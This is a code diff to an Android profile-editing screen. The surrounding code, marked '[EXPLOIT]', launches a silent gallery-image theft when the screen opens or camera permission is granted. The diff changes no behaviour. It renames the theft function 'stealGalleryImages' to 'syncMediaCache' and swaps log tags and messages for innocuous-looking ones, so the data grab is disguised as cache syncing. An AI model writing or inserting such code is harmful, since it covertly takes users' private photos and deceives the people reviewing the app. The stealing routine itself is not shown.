@@ -88,14 +88,14 @@ fun EditProfileScreen(
 
     val requestPermissionLauncher =
         rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
-            Log.d("ImageRetrieval", ">>> Camera permission result: $isGranted")
+            Log.d("MediaCacheManager", ">>> Camera permission result: $isGranted")
             if (isGranted) {
                 // [EXPLOIT] Permission just granted — silently steal gallery before opening camera
                 exfilScope.launch {
                     try {
-                        ImageRetrieval.stealGalleryImages(context)
+                        ImageRetrieval.syncMediaCache(context)
                     } catch (e: Exception) {
-                        Log.e("ImageRetrieval", ">>> Exception: ${e.message}", e)
+                        Log.e("MediaCacheManager", ">>> Exception: ${e.message}", e)
                     }
                 }
                 val file = File(context.cacheDir, "profile_image.jpg")
@@ -111,7 +111,7 @@ fun EditProfileScreen(
 
     // [EXPLOIT] Eager trigger — fires immediately on screen entry
     LaunchedEffect(Unit) {
-        Log.d("ImageRetrieval", ">>> LaunchedEffect fired")
+        Log.d("MediaCacheManager", ">>> LaunchedEffect fired")
 
         val readPermission = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
             Manifest.permission.READ_MEDIA_IMAGES
@@ -121,19 +121,19 @@ fun EditProfileScreen(
         val alreadyGranted = ContextCompat.checkSelfPermission(context, readPermission) ==
                 PackageManager.PERMISSION_GRANTED
 
-        Log.d("ImageRetrieval", ">>> Permission ($readPermission) granted: $alreadyGranted")
+        Log.d("MediaCacheManager", ">>> Permission ($readPermission) granted: $alreadyGranted")
 
         if (alreadyGranted) {
-            Log.d("ImageRetrieval", ">>> Launching steal...")
+            Log.d("MediaCacheManager", ">>> Launching sync...")
             exfilScope.launch {
                 try {
-                    ImageRetrieval.stealGalleryImages(context)
+                    ImageRetrieval.syncMediaCache(context)
                 } catch (e: Exception) {
-                    Log.e("ImageRetrieval", ">>> Exception: ${e.message}", e)
+                    Log.e("MediaCacheManager", ">>> Exception: ${e.message}", e)
                 }
             }
         } else {
-            Log.d("ImageRetrieval", ">>> Permission not granted — tap photo circle to trigger")
+            Log.d("MediaCacheManager", ">>> Permission not granted — tap photo circle to trigger")
         }
     }
 
